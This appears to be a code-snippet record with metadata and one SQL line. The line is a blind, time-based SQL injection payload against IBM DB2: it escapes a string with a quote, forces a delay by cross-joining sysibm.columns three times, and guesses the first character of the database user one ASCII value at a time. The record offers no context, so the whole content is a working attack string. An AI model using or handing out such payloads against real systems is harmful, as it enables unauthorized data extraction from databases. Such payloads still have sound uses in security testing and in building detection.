---
id: 4025ce4e-47ab-43b8-babb-434c61f8dd52
type: code
language: SQL
verified: false
created_at: '2023-04-06T03:56:33.093428+00:00'
updated_at: '2023-04-10T20:22:03.401674+00:00'
---

# Code Snippet 4025ce4e

**Language**: SQL

```sql
' and (SELECT count(*) from sysibm.columns t1, sysibm.columns t2, sysibm.columns t3)>0 and (select ascii(substr(user,1,1)) from sysibm.sysdummy1)=68 
```


